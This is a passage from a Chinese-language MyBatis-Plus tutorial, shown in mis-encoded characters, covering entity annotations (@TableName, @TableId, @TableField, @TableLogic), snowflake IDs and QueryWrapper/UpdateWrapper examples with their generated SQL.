ä¸ºç°åœ¨çš„è¡¨åä¸º`t_user`ï¼Œè€Œé»˜è®¤æ“ä½œçš„è¡¨åå’Œå®ä½“ç±»å‹çš„ç±»åä¸€è‡´ï¼Œå³`user`è¡¨\n\n![](https://img.jwt1399.top/img/202207031137098.png)\n\n#### 1.2\tè§£å†³é—®é¢˜\n\n##### aã€ä½¿ç”¨æ³¨è§£è§£å†³é—®é¢˜\n\n> **åœ¨å®ä½“ç±»ç±»å‹ä¸Šæ·»åŠ `@TableName(\"t_user\")`ï¼Œæ ‡è¯†å®ä½“ç±»å¯¹åº”çš„è¡¨ï¼Œå³å¯æˆåŠŸæ‰§è¡ŒSQLè¯­å¥**\n\n```java\n@Data\n@TableName(\"t_user\")\npublic class User {\n    private Long id;\n    private String name;\n    private Integer age;\n    private String email;\n}\n```\n\n##### bã€ä½¿ç”¨å…¨å±€é…ç½®è§£å†³é—®é¢˜\n\n> **åœ¨å¼€å‘çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸é‡åˆ°è¿™æ ·çš„é—®é¢˜ï¼Œå³å®ä½“ç±»æ‰€å¯¹åº”çš„è¡¨éƒ½æœ‰å›ºå®šçš„å‰ç¼€ï¼Œä¾‹å¦‚ `t_` æˆ– `tbl_` æ­¤æ—¶ï¼Œå¯ä»¥ä½¿ç”¨MyBatis-Plusæä¾›çš„å…¨å±€é…ç½®ï¼Œä¸ºå®ä½“ç±»æ‰€å¯¹åº”çš„è¡¨åè®¾ç½®é»˜è®¤çš„å‰ç¼€ï¼Œé‚£ä¹ˆå°±ä¸éœ€è¦åœ¨æ¯ä¸ªå®ä½“ç±»ä¸Šé€šè¿‡@TableNameæ ‡è¯†å®ä½“ç±»å¯¹åº”çš„è¡¨**\n\n```yml\nmybatis-plus:\n  global-config:\n    db-config:\n      # è®¾ç½®å®ä½“ç±»æ‰€å¯¹åº”çš„è¡¨çš„ç»Ÿä¸€å‰ç¼€\n      table-prefix: t_\n```\n\n### 2.@TableId\n\n> **MyBatis-Plusåœ¨å®ç°CRUDæ—¶ï¼Œä¼šé»˜è®¤å°†idä½œä¸ºä¸»é”®åˆ—ï¼Œå¹¶åœ¨æ’å…¥æ•°æ®æ—¶ï¼Œé»˜è®¤åŸºäºé›ªèŠ±ç®—æ³•çš„ç­–ç•¥ç”Ÿæˆid**\n\n#### 2.1\tå¼•å‡ºé—®é¢˜\n\n---\n\n> **è‹¥å®ä½“ç±»å’Œè¡¨ä¸­è¡¨ç¤ºä¸»é”®çš„ä¸æ˜¯idï¼Œè€Œæ˜¯å…¶ä»–å­—æ®µï¼Œä¾‹å¦‚uidï¼ŒMyBatis-Plusä¼šè‡ªåŠ¨è¯†åˆ«uidä¸ºä¸»é”®åˆ—å—ï¼Ÿ**\n\næˆ‘ä»¬å®ä½“ç±»ä¸­çš„å±æ€§`id`æ”¹ä¸º`uid`ï¼Œå°†è¡¨ä¸­çš„å­—æ®µ`id`ä¹Ÿæ”¹ä¸º`uid`ï¼Œæµ‹è¯•æ·»åŠ åŠŸèƒ½\n\n![](https://img.jwt1399.top/img/202207031144629.png)\n\n![](https://img.jwt1399.top/img/202207031144303.png)\n\nç¨‹åºæŠ›å‡ºå¼‚å¸¸ï¼Œ**Field 'uid' doesn't have a default value**ï¼Œè¯´æ˜MyBatis-Plusæ²¡æœ‰å°†`uid`ä½œä¸ºä¸»é”®èµ‹å€¼\n\n![](https://img.jwt1399.top/img/202207031145905.png)\n\n#### 2.2\tè§£å†³é—®é¢˜\n\n---\n\n> **åœ¨å®ä½“ç±»ä¸­uidå±æ€§ä¸Šé€šè¿‡`@TableId`å°†å…¶æ ‡è¯†ä¸ºä¸»é”®ï¼Œå³å¯æˆåŠŸæ‰§è¡ŒSQLè¯­å¥**\n\n```java\n@Date\npublic class User {\n    @TableId\n    private Long uid;\n    private String name;\n    private Integer age;\n    private String email;\n}\n```\n\n#### 2.3\t@TableIdçš„valueå±æ€§\n\n---\n\n> **è‹¥å®ä½“ç±»ä¸­ä¸»é”®å¯¹åº”çš„å±æ€§ä¸ºidï¼Œè€Œè¡¨ä¸­è¡¨ç¤ºä¸»é”®çš„å­—æ®µä¸ºuid**ï¼Œæ­¤æ—¶è‹¥åªåœ¨å±æ€§idä¸Šæ·»åŠ æ³¨è§£@TableIdï¼Œåˆ™æŠ›å‡ºå¼‚å¸¸**Unknown column 'id' in 'field list'**ï¼Œå³MyBatis-Plusä»ç„¶ä¼šå°†idä½œä¸ºè¡¨çš„ä¸»é”®æ“ä½œï¼Œè€Œè¡¨ä¸­è¡¨ç¤ºä¸»é”®çš„æ˜¯å­—æ®µuidæ­¤æ—¶éœ€è¦é€šè¿‡@TableIdæ³¨è§£çš„valueå±æ€§ï¼ŒæŒ‡å®šè¡¨ä¸­çš„ä¸»é”®å­—æ®µï¼Œ`@TableId(\"uid\")`æˆ–`@TableId(value=\"uid\")`\n\n![](https://img.jwt1399.top/img/202207031147569.png)\n\n#### 2.4\t@TableIdçš„typeå±æ€§\n\n---\n\n> **typeå±æ€§ç”¨æ¥å®šä¹‰ä¸»é”®ç­–ç•¥ï¼šé»˜è®¤é›ªèŠ±ç®—æ³•**\n\n**å¸¸ç”¨çš„ä¸»é”®ç­–ç•¥ï¼š**\n\n|            å€¼            |                             æè¿°                             |\n| :----------------------: | :----------------------------------------------------------: |\n| IdType.ASSIGN_IDï¼ˆé»˜è®¤ï¼‰ |   åŸºäºé›ªèŠ±ç®—æ³•çš„ç­–ç•¥ç”Ÿæˆæ•°æ®idï¼Œä¸æ•°æ®åº“idæ˜¯å¦è®¾ç½®è‡ªå¢æ— å…³   |\n|       IdType.AUTO        | ä½¿ç”¨æ•°æ®åº“çš„è‡ªå¢ç­–ç•¥ï¼Œæ³¨æ„ï¼Œè¯¥ç±»å‹è¯·ç¡®ä¿æ•°æ®åº“è®¾ç½®äº†idè‡ªå¢ï¼Œ |\n\n**é…ç½®å…¨å±€ä¸»é”®ç­–ç•¥ï¼š**\n\n```yml\nmybatis-plus:\n  global-config:\n    db-config:\n      #é…ç½®mpçš„ä¸»é”®ç­–ç•¥ä¸ºè‡ªå¢\n      id-type: auto\n```\n\n#### 2.5 é›ªèŠ±ç®—æ³•\n\n> éœ€è¦é€‰æ‹©åˆé€‚çš„æ–¹æ¡ˆå»åº”å¯¹æ•°æ®è§„æ¨¡çš„å¢é•¿ï¼Œä»¥åº”å¯¹é€æ¸å¢é•¿çš„è®¿é—®å‹åŠ›å’Œæ•°æ®é‡ã€‚æ•°æ®åº“çš„æ‰©å±•æ–¹å¼ä¸»è¦åŒ…æ‹¬ï¼šä¸šåŠ¡åˆ†åº“ã€ä¸»ä»å¤åˆ¶ï¼Œæ•°æ®åº“åˆ†è¡¨ã€‚\n\næ•°æ®åˆ†è¡¨ï¼š å°†ä¸åŒä¸šåŠ¡æ•°æ®åˆ†æ•£å­˜å‚¨åˆ°ä¸åŒçš„æ•°æ®åº“æœåŠ¡å™¨ï¼Œèƒ½å¤Ÿæ”¯æ’‘ç™¾ä¸‡ç”šè‡³åƒä¸‡ç”¨æˆ·è§„æ¨¡çš„ä¸šåŠ¡ï¼Œä½†å¦‚æœä¸šåŠ¡ç»§ç»­å‘å±•ï¼ŒåŒä¸€ä¸šåŠ¡çš„å•è¡¨æ•°æ®ä¹Ÿä¼šè¾¾åˆ°å•å°æ•°æ®åº“æœåŠ¡å™¨çš„å¤„ç†ç“¶é¢ˆã€‚ä¾‹å¦‚ï¼Œæ·˜å®çš„å‡ äº¿ç”¨æˆ·æ•°æ®ï¼Œå¦‚æœå…¨éƒ¨å­˜æ”¾åœ¨ä¸€å°æ•°æ®åº“æœåŠ¡å™¨çš„ä¸€å¼ è¡¨ä¸­ï¼Œè‚¯å®šæ˜¯æ— æ³•æ»¡è¶³æ€§èƒ½è¦æ±‚çš„ï¼Œæ­¤æ—¶å°±éœ€è¦å¯¹å•è¡¨æ•°æ®è¿›è¡Œæ‹†åˆ†ã€‚å•è¡¨æ•°æ®æ‹†åˆ†æœ‰ä¸¤ç§æ–¹å¼ï¼šå‚ç›´åˆ†è¡¨å’Œæ°´å¹³åˆ†è¡¨ã€‚\n\n**a.ä¸»é”®è‡ªå¢**\n\nâ‘ ä»¥æœ€å¸¸è§çš„ç”¨æˆ· ID ä¸ºä¾‹ï¼Œå¯ä»¥æŒ‰ç…§ 1000000 çš„èŒƒå›´å¤§å°è¿›è¡Œåˆ†æ®µï¼Œ1 ~ 999999 æ”¾åˆ°è¡¨ 1ä¸­ï¼Œ 1000000 ~ 1999999 æ”¾åˆ°è¡¨2ä¸­ï¼Œä»¥æ­¤ç±»æ¨ã€‚\n\nâ‘¡å¤æ‚ç‚¹ï¼šåˆ†æ®µå¤§å°çš„é€‰å–ã€‚åˆ†æ®µå¤ªå°ä¼šå¯¼è‡´åˆ‡åˆ†åå­è¡¨æ•°é‡è¿‡å¤šï¼Œå¢åŠ ç»´æŠ¤å¤æ‚åº¦ï¼›åˆ†æ®µå¤ªå¤§å¯èƒ½ä¼šå¯¼è‡´å•è¡¨ä¾ç„¶å­˜åœ¨æ€§èƒ½é—®é¢˜ï¼Œä¸€èˆ¬å»ºè®®åˆ†æ®µå¤§å°åœ¨ 100 ä¸‡è‡³ 2000 ä¸‡ä¹‹é—´ï¼Œå…·ä½“éœ€è¦æ ¹æ®ä¸šåŠ¡é€‰å–åˆé€‚çš„åˆ†æ®µå¤§å°ã€‚\n\nâ‘¢ä¼˜ç‚¹ï¼šå¯ä»¥éšç€æ•°æ®çš„å¢åŠ å¹³æ»‘åœ°æ‰©å……æ–°çš„è¡¨ã€‚ä¾‹å¦‚ï¼Œç°åœ¨çš„ç”¨æˆ·æ˜¯ 100 ä¸‡ï¼Œå¦‚æœå¢åŠ åˆ° 1000 ä¸‡ï¼Œåªéœ€è¦å¢åŠ æ–°çš„è¡¨å°±å¯ä»¥äº†ï¼ŒåŸæœ‰çš„æ•°æ®ä¸éœ€è¦åŠ¨ã€‚\n\nâ‘£ç¼ºç‚¹ï¼šåˆ†å¸ƒä¸å‡åŒ€ã€‚å‡å¦‚æŒ‰ç…§ 1000 ä¸‡æ¥è¿›è¡Œåˆ†è¡¨ï¼Œæœ‰å¯èƒ½æŸä¸ªåˆ†æ®µå®é™…å­˜å‚¨çš„æ•°æ®é‡åªæœ‰ 1 æ¡ï¼Œè€Œå¦å¤–ä¸€ä¸ªåˆ†æ®µå®é™…å­˜å‚¨çš„æ•°æ®é‡æœ‰ 1000 ä¸‡æ¡ã€‚\n\n**b.å–æ¨¡**\n\nâ‘ åŒæ ·ä»¥ç”¨æˆ· ID ä¸ºä¾‹ï¼Œå‡å¦‚æˆ‘ä»¬ä¸€å¼€å§‹å°±è§„åˆ’äº† 10 ä¸ªæ•°æ®åº“è¡¨ï¼Œå¯ä»¥ç®€å•åœ°ç”¨ user_id % 10 çš„å€¼æ¥è¡¨ç¤ºæ•°æ®æ‰€å±çš„æ•°æ®åº“è¡¨ç¼–å·ï¼ŒID ä¸º 985 çš„ç”¨æˆ·æ”¾åˆ°ç¼–å·ä¸º 5 çš„å­è¡¨ä¸­ï¼ŒID ä¸º 10086 çš„ç”¨æˆ·æ”¾åˆ°ç¼–å·ä¸º 6 çš„å­è¡¨ä¸­ã€‚\n\nâ‘¡å¤æ‚ç‚¹ï¼šåˆå§‹è¡¨æ•°é‡çš„ç¡®å®šã€‚è¡¨æ•°é‡å¤ªå¤šç»´æŠ¤æ¯”è¾ƒéº»çƒ¦ï¼Œè¡¨æ•°é‡å¤ªå°‘åˆå¯èƒ½å¯¼è‡´å•è¡¨æ€§èƒ½å­˜åœ¨é—®é¢˜ã€‚\n\nâ‘¢ä¼˜ç‚¹ï¼šè¡¨åˆ†å¸ƒæ¯”è¾ƒå‡åŒ€ã€‚\n\nâ‘£ç¼ºç‚¹ï¼šæ‰©å……æ–°çš„è¡¨å¾ˆéº»çƒ¦ï¼Œæ‰€æœ‰æ•°æ®éƒ½è¦é‡åˆ†å¸ƒã€‚\n\n**c.é›ªèŠ±ç®—æ³•**\n\n> é›ªèŠ±ç®—æ³•æ˜¯ç”±Twitterå…¬å¸ƒçš„åˆ†å¸ƒå¼ä¸»é”®ç”Ÿæˆç®—æ³•ï¼Œå®ƒèƒ½å¤Ÿä¿è¯ä¸åŒè¡¨çš„ä¸»é”®çš„ä¸é‡å¤æ€§ï¼Œä»¥åŠç›¸åŒè¡¨çš„ä¸»é”®çš„æœ‰åºæ€§ã€‚\n\nâ‘ æ ¸å¿ƒæ€æƒ³ï¼šé•¿åº¦å…±64bitï¼ˆä¸€ä¸ªlongå‹ï¼‰\n\n- `1bit`ç¬¦å·ä½ï¼Œç”±äºlongåŸºæœ¬ç±»å‹åœ¨Javaä¸­æ˜¯å¸¦ç¬¦å·çš„ï¼Œæœ€é«˜ä½æ˜¯ç¬¦å·ä½ï¼Œæ­£æ•°æ˜¯0ï¼Œè´Ÿæ•°æ˜¯1ï¼Œidä¸€èˆ¬æ˜¯æ­£æ•°ï¼Œæœ€é«˜ä½æ˜¯0ã€‚\n\n- `41bit`æ—¶é—´æˆª(æ¯«ç§’çº§)ï¼Œå­˜å‚¨çš„æ˜¯æ—¶é—´æˆªçš„å·®å€¼ï¼ˆå½“å‰æ—¶é—´æˆª - å¼€å§‹æ—¶é—´æˆª)ï¼Œç»“æœçº¦ç­‰äº69.73å¹´ã€‚ \n\n- `10bit`ä½œä¸ºæœºå™¨çš„IDï¼ˆ5ä¸ªbitæ˜¯æ•°æ®ä¸­å¿ƒï¼Œ5ä¸ªbitçš„æœºå™¨IDï¼Œå¯ä»¥éƒ¨ç½²åœ¨1024ä¸ªèŠ‚ç‚¹ï¼‰ã€‚\n- `12bit`ä½œä¸ºæ¯«ç§’å†…çš„æµæ°´å·ï¼ˆæ„å‘³ç€æ¯ä¸ªèŠ‚ç‚¹åœ¨æ¯æ¯«ç§’å¯ä»¥äº§ç”Ÿ 4096 ä¸ª IDï¼‰ã€‚\n\n![](https://img.jwt1399.top/img/202207031208423.png)\n\nâ‘¡ä¼˜ç‚¹ï¼šæ•´ä½“ä¸ŠæŒ‰ç…§æ—¶é—´è‡ªå¢æ’åºï¼Œå¹¶ä¸”æ•´ä¸ªåˆ†å¸ƒå¼ç³»ç»Ÿå†…ä¸ä¼šäº§ç”ŸIDç¢°æ’ï¼Œå¹¶ä¸”æ•ˆç‡è¾ƒé«˜ã€‚\n\n### 3.@TbaleField\n\n> MyBatis-Plusåœ¨æ‰§è¡ŒSQLè¯­å¥æ—¶ï¼Œè¦ä¿è¯**å®ä½“ç±»ä¸­çš„å±æ€§å**å’Œ**è¡¨ä¸­çš„å­—æ®µå**`ä¸€è‡´`\n>\n> å¦‚æœå®ä½“ç±»ä¸­çš„å±æ€§åå’Œå­—æ®µåä¸ä¸€è‡´çš„æƒ…å†µï¼Œä¼šå‡ºç°ä»€ä¹ˆé—®é¢˜å‘¢ï¼Ÿ\n\n#### 3.1\tæƒ…å†µä¸€\n\n---\n\nè‹¥å®ä½“ç±»ä¸­çš„å±æ€§ä½¿ç”¨çš„æ˜¯é©¼å³°å‘½åé£æ ¼ï¼Œè€Œè¡¨ä¸­çš„å­—æ®µä½¿ç”¨çš„æ˜¯ä¸‹åˆ’çº¿å‘½åé£æ ¼\n\nä¾‹å¦‚å®ä½“ç±»å±æ€§`userName`ï¼Œè¡¨ä¸­å­—æ®µ`user_name`\n\næ­¤æ—¶MyBatis-Plusä¼šè‡ªåŠ¨å°†ä¸‹åˆ’çº¿å‘½åé£æ ¼è½¬åŒ–ä¸ºé©¼å³°å‘½åé£æ ¼\n\nç›¸å½“äºåœ¨MyBatisä¸­é…ç½®\n\n#### 3.2\tæƒ…å†µäºŒ\n\n---\n\n> è‹¥å®ä½“ç±»ä¸­çš„å±æ€§å’Œè¡¨ä¸­çš„å­—æ®µä¸æ»¡è¶³æƒ…å†µ1\n>\n> ä¾‹å¦‚å®ä½“ç±»å±æ€§`name`ï¼Œè¡¨ä¸­å­—æ®µ`username`\n>\n> æ­¤æ—¶éœ€è¦åœ¨å®ä½“ç±»å±æ€§ä¸Šä½¿ç”¨`@TableField(\"username\")`è®¾ç½®å±æ€§æ‰€å¯¹åº”çš„å­—æ®µå\n\n```java\npublic class User {\n    @TableId(\"uid\")\n    private Long id;\n    @TableField(\"username\")\n    private String name;\n    private Integer age;\n    private String email;\n}\n```\n\n### 4.@TableLogic\n\n#### 4.1\té€»è¾‘åˆ é™¤\n\n---\n\n> ç‰©ç†åˆ é™¤ï¼šçœŸå®åˆ é™¤ï¼Œå°†å¯¹åº”æ•°æ®ä»æ•°æ®åº“ä¸­åˆ é™¤ï¼Œä¹‹åæŸ¥è¯¢ä¸åˆ°æ­¤æ¡è¢«åˆ é™¤çš„æ•°æ®\n>\n> é€»è¾‘åˆ é™¤ï¼šå‡åˆ é™¤ï¼Œå°†å¯¹åº”æ•°æ®ä¸­ä»£è¡¨æ˜¯å¦è¢«åˆ é™¤å­—æ®µçš„çŠ¶æ€ä¿®æ”¹ä¸ºâ€œè¢«åˆ é™¤çŠ¶æ€â€ï¼Œä¹‹ååœ¨æ•°æ®åº“ä¸­ä»æ—§èƒ½çœ‹åˆ°æ­¤æ¡æ•°æ®è®°å½•\n>\n> ä½¿ç”¨åœºæ™¯ï¼šå¯ä»¥è¿›è¡Œæ•°æ®æ¢å¤\n\n#### 4.2\tå®ç°é€»è¾‘åˆ é™¤\n\n---\n\n- **æ•°æ®åº“ä¸­åˆ›å»ºé€»è¾‘åˆ é™¤çŠ¶æ€åˆ—ï¼Œè®¾ç½®é»˜è®¤å€¼ä¸º0**\n\n  ![](https://img.jwt1399.top/img/202207031152971.png)\n\n- **å®ä½“ç±»ä¸­æ·»åŠ é€»è¾‘åˆ é™¤å±æ€§**\n\n  ![](https://img.jwt1399.top/img/202207031152325.png)\n\n\n**æµ‹è¯•åˆ é™¤åŠŸèƒ½**\n\n```java\npublic void testDeleteById(){\n    int result = userMapper.deleteById(1527472864163348482L);\n    System.out.println(result > 0 ? \"åˆ é™¤æˆåŠŸï¼\" : \"åˆ é™¤å¤±è´¥ï¼\");\n    System.out.println(\"å—å½±å“çš„è¡Œæ•°ä¸ºï¼š\" + result);\n}\n```\n\n**çœŸæ­£æ‰§è¡Œçš„æ˜¯ä¿®æ”¹**\n\n```sql\nUPDATE t_user SET is_deleted=1 WHERE id=? AND is_deleted=0\n```\n\n![](https://img.jwt1399.top/img/202207031153004.png)\n\n**æµ‹è¯•æŸ¥è¯¢æ–¹æ³•ï¼Œè¢«é€»è¾‘åˆ é™¤çš„æ•°æ®é»˜è®¤ä¸ä¼šè¢«æŸ¥è¯¢**\n\n**æŸ¥è¯¢çš„ç»“æœè‡ªåŠ¨æ·»åŠ æ¡ä»¶`is_deleted=0`**\n\n![](https://img.jwt1399.top/img/202207031157318.png)\n\n## å››ã€æ¡ä»¶æ„é€ å™¨\n\n### 1.Wrapperä»‹ç»\n\n![](https://img.jwt1399.top/img/202207031615764.png)\n\n`Wrapper` ï¼š æ¡ä»¶æ„é€ æŠ½è±¡ç±»ï¼Œæœ€é¡¶ç«¯çˆ¶ç±»\n\n- `AbstractWrapper `ï¼š ç”¨äºæŸ¥è¯¢æ¡ä»¶å°è£…ï¼Œç”Ÿæˆ sql çš„ where æ¡ä»¶\n\n  - `QueryWrapper `ï¼š æŸ¥è¯¢æ¡ä»¶å°è£…\n\n  - `UpdateWrapper `ï¼š Update æ¡ä»¶å°è£…\n\n  - `AbstractLambdaWrapper `ï¼š ä½¿ç”¨Lambda è¯­æ³•\n\n    - `LambdaQueryWrapper `ï¼šç”¨äºLambdaè¯­æ³•ä½¿ç”¨çš„æŸ¥è¯¢Wrapper\n\n    - `LambdaUpdateWrapper `ï¼š Lambda æ›´æ–°å°è£…Wrapper\n\n### 2.QueryWrapper\n\n#### **ç»„è£…æŸ¥è¯¢æ¡ä»¶**\n\n> **æ‰§è¡ŒSQLï¼š**SELECT uid AS id,username AS name,age,email,is_deleted FROM t_user WHERE is_deleted=0 AND (username LIKE ? AND age BETWEEN ? AND ? AND email IS NOT NULL)\n\n```java\npublic void test01(){\n    //æŸ¥è¯¢ç”¨æˆ·ååŒ…å«aï¼Œå¹´é¾„åœ¨20åˆ°30ä¹‹é—´ï¼Œé‚®ç®±ä¿¡æ¯ä¸ä¸ºnullçš„ç”¨æˆ·ä¿¡æ¯\n    QueryWrapper<User> queryWrapper = new QueryWrapper<>();\n\t\tqueryWrapper.like(\"username\",\"a\")\n  \t\t\t\t\t\t\t.between(\"age\",20,30)\n      \t\t\t\t\t.isNotNull(\"email\");\n    List<User> users = userMapper.selectList(queryWrapper);\n    users.forEach(System.out::println);\n}\n```\n\n#### **ç»„è£…æ’åºæ¡ä»¶**\n\n> **æ‰§è¡ŒSQLï¼š**SELECT uid AS id,username AS name,age,email,is_deleted FROM t_user WHERE is_deleted=0 ORDER BY age DESC,id ASC\n\n```java\npublic void test02(){\n    //æŸ¥è¯¢ç”¨æˆ·ä¿¡æ¯ï¼ŒæŒ‰ç…§å¹´é¾„çš„é™åºæ’åºï¼Œè‹¥å¹´é¾„ç›¸åŒï¼Œåˆ™æŒ‰ç…§idå‡åºæ’åº\n    QueryWrapper<User> queryWrapper = new QueryWrapper<>();\n    queryWrapper.orderByDesc(\"age\").orderByAsc(\"id\");\n    List<User> users = userMapper.selectList(queryWrapper);\n    users.forEach(System.out::println);\n}\n```\n\n#### **ç»„è£…åˆ é™¤æ¡ä»¶**\n\n> **æ‰§è¡ŒSQLï¼š**UPDATE t_user SET is_deleted=1 WHERE is_deleted=0 AND (email IS NULL)\n\n```java\npublic void test03(){\n    //åˆ é™¤é‚®ç®±åœ°å€ä¸ºnullçš„ç”¨æˆ·ä¿¡æ¯\n    QueryWrapper<User> queryWrapper = new QueryWrapper<>();\n    queryWrapper.isNull(\"email\");\n    int result = userMapper.delete(queryWrapper);\n    System.out.println(result > 0 ? \"åˆ é™¤æˆåŠŸï¼\" : \"åˆ é™¤å¤±è´¥ï¼\");\n    System.out.println(\"å—å½±å“çš„è¡Œæ•°ä¸ºï¼š\" + result);\n}\n```\n\n#### **æ¡ä»¶çš„ä¼˜å…ˆçº§**\n\n> **æ‰§è¡ŒSQLï¼š**UPDATE t_user SET user_name=?, email=? WHERE is_deleted=0 AND (age > ? AND user_name LIKE ? OR email IS NULL)\n\n```java\npublic void test04(){\n    //å°†ï¼ˆå¹´é¾„å¤§äº20å¹¶ä¸”ç”¨æˆ·åä¸­åŒ…å«æœ‰aï¼‰æˆ–é‚®ç®±ä¸ºnullçš„ç”¨æˆ·ä¿¡æ¯ä¿®æ”¹\n    UpdateWrapper<User> updateWrapper = new UpdateWrapper<>();\n    updateWrapper.gt(\"age\",20).like(\"username\",\"a\").or().isNull(\"email\");\n    User user = new User();\n    user.setName(\"Oz\");\n    user.setEmail(\"test@oz6.com\");\n\n    int result = userMapper.update(user, updateWrapper);\n    System.out.println(result > 0 ? \"ä¿®æ”¹æˆåŠŸï¼\" : \"ä¿®æ”¹å¤±è´¥ï¼\");\n    System.out.println(\"å—å½±å“çš„è¡Œæ•°ä¸ºï¼š\" + result);\n}\n```\n\n> **æ‰§è¡ŒSQLï¼š**UPDATE t_user SET username=?, email=? WHERE is_deleted=0 AND (username LIKE ? AND (age > ? OR email IS NULL))\n\n```java\npublic void test05(){\n    //å°†ç”¨æˆ·åä¸­åŒ…å«æœ‰aå¹¶ä¸”ï¼ˆå¹´é¾„å¤§äº20æˆ–é‚®ç®±ä¸ºnullï¼‰çš„ç”¨æˆ·ä¿¡æ¯ä¿®æ”¹\n    UpdateWrapper<User> updateWrapper = new UpdateWrapper<>();\n    updateWrapper.like(\"username\",\"a\").and(i->i.gt(\"age\",20).or().isNull(\"email\"));\n    User user = new User();\n    user.setName(\"Vz7797\");\n    user.setEmail(\"test@ss8o.com\");\n\n    int result = userMapper.update(user, updateWrapper);\n    System.out.println(result > 0 ? \"ä¿®æ”¹æˆåŠŸï¼\" : \"ä¿®æ”¹å¤±è´¥ï¼\");\n    System.out.println(\"å—å½±å“çš„è¡Œæ•°ä¸ºï¼š\" + result);\n}\n```\n\n#### **ç»„è£…selectå­å¥**\n\n> **æ‰§è¡ŒSQLï¼š**SELECT username,age,email FROM t_user WHERE is_deleted=0\n\n```java\npublic void test06(){\n    //æŸ¥è¯¢ç”¨æˆ·çš„ç”¨æˆ·åã€å¹´é¾„ã€é‚®ç®±ä¿¡æ¯\n    QueryWrapper<User> queryWrapper = new QueryWrapper<>();\n    queryWrapper.select(\"username\",\"age\",\"email\");\n    List<Map<String, Object>> maps = userMapper.selectMaps(queryWrapper);\n    maps.forEach(System.out::println);\n}\n```\n\n#### **å®ç°å­æŸ¥è¯¢**\n\n> **æ‰§è¡ŒSQLï¼š**SELECT uid AS id,user_name AS name,age,email,is_deleted FROM t_user WHERE is_deleted=0 AND (uid IN (select uid from t_user where uid <= 100))\n\n```java\npublic void test07(){\n    //æŸ¥è¯¢idå°äºç­‰äº100çš„ç”¨æˆ·ä¿¡æ¯\n    QueryWrapper<User> queryWrapper = new QueryWrapper<>();\n    queryWrapper.inSql(\"uid\", \"select uid from t_user where uid <= 100\");\n    List<User> list = userMapper.selectList(queryWrapper);\n    list.forEach(System.out::println);\n}\n```\n\n### 3.UpdateWrapper\n\n> UpdateWrapperä¸ä»…æ‹¥æœ‰QueryWrapperçš„ç»„è£…æ¡ä»¶åŠŸèƒ½ï¼Œè¿˜æä¾›äº†setæ–¹æ³•è¿›è¡Œä¿®æ”¹å¯¹åº”æ¡ä»¶çš„æ•°æ®åº“ä¿¡æ¯\n\n```java\npublic void test08(){\n    //å°†ç”¨æˆ·åä¸­åŒ…å«æœ‰aå¹¶ä¸”ï¼ˆå¹´é¾„å¤§äº20æˆ–é‚®ç®±ä¸ºnullï¼‰çš„ç”¨æˆ·ä¿¡æ¯ä¿®æ”¹\n    UpdateWrapper<User> updateWrapper = new UpdateWrapper<>();\n    updateWrapper.like(\"username\",\"a\")\n      \t\t\t\t\t.and(i -> i.gt(\"age\",20)\n                .or()\n                .isNull(\"email\"))\n     \t\t\t\t\t  .set(\"email\",\"jian@qq.com\");\n    int result = userMapper.update(null, updateWrapper);\n    System.out.println(result > 0 ? \"ä¿®æ”¹æˆåŠŸï¼\" : \"ä¿®æ”¹å¤±è´¥ï¼\");\n    System.out.println(\"å—å½±å“çš„è¡Œæ•°ä¸ºï¼š\" + result);\n}\n```\n\n### 4.condition\n\n> åœ¨çœŸæ­£å¼€å‘çš„è¿‡ç¨‹ä¸­ï¼Œç»„è£…æ¡ä»¶æ˜¯å¸¸è§çš„åŠŸèƒ½ï¼Œè€Œè¿™äº›æ¡ä»¶å¾€å¾€æ¥æºäºç”¨æˆ·è¾“å…¥ï¼Œæ˜¯å¯é€‰çš„ï¼Œå› æ­¤æˆ‘ä»¬åœ¨ç»„è£…è¿™äº›æ¡ä»¶æ—¶ï¼Œå¿…é¡»å…ˆåˆ¤æ–­ç”¨æˆ·æ˜¯å¦é€‰æ‹©äº†è¿™äº›æ¡ä»¶ï¼Œè‹¥é€‰æ‹©åˆ™éœ€è¦ç»„è£…è¯¥æ¡ä»¶ï¼Œè‹¥æ²¡æœ‰é€‰æ‹©åˆ™ä¸€å®šä¸èƒ½ç»„è£…ï¼Œä»¥å…å½±å“SQLæ‰§è¡Œçš„ç»“æœ\n\n**æ€è·¯ä¸€**\n\n> **æ‰§è¡ŒSQLï¼š**SELECT uid AS id,user_name AS name,age,email,is_deleted FROM t_user WHERE is_deleted=0 AND (user_name LIKE ? AND age <= ?)\n\n```java\n public void test09(){\n     String username = \"a\";\n     Integer ageBegin = null;\n     Integer ageEnd = 30;\n     QueryWrapper<User> queryWrapper = new QueryWrapper<>();\n     if(StringUtils.isNotBlank(username)){\n         //isNotBlankåˆ¤æ–­æŸä¸ªå­—ç¬¦åˆ›æ˜¯å¦ä¸ä¸ºç©ºå­—ç¬¦ä¸²ã€ä¸ä¸ºnullã€ä¸ä¸ºç©ºç™½ç¬¦\n         queryWrapper.like(\"user_name\", username);\n     }\n     if(ageBegin != null){\n         queryWrapper.ge(\"age\", ageBegin);\n     }\n     if(ageEnd != null){\n         queryWrapper.le(\"age\", ageEnd);\n     }\n     List<User> list = userMapper.selectList(queryWrapper);\n     list.forEach(System.out::println);\n }\n```\n\n**æ€è·¯äºŒ**\n\n> ä¸Šé¢çš„å®ç°æ–¹æ¡ˆæ²¡æœ‰é—®é¢˜ï¼Œä½†æ˜¯ä»£ç æ¯”è¾ƒå¤æ‚ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¸¦conditionå‚æ•°çš„é‡è½½æ–¹æ³•æ„å»ºæŸ¥è¯¢æ¡ä»¶ï¼Œç®€åŒ–ä»£ç çš„ç¼–å†™\n\n```java\npublic void test10(){\n    String username = \"a\";\n    Integer ageBegin = null;\n    Integer ageEnd = 30;\n    QueryWrapper<User> queryWrapper = new QueryWrapper<>();\n    queryWrapper.like(StringUtils.isNotBlank(username), \"user_name\", username)\n        .ge(ageBegin != null, \"age\", ageBegin)\n        .le(ageEnd != null, \"age\", ageEnd);\n    List<User> list = userMapper.selectList(queryWrapper);\n    list.forEach(System.out::println);\n}\n```\n\n### 5.LambdaQueryWrapper\n\n> åŠŸèƒ½ç­‰åŒäºQueryWrapperï¼Œæä¾›äº†Lambdaè¡¨è¾¾å¼çš„è¯­æ³•å¯ä»¥é¿å…å¡«é”™åˆ—åã€‚\n\n```java\npublic void test11(){\n    String username = \"a\";\n    Integer ageBegin = null;\n    Integer ageEnd = 30;\n    LambdaQueryWrapper<User> queryWrapper = new LambdaQueryWrapper<>();\n    queryWrapper.like(StringUtils.isNotBlank(username), User::getName, 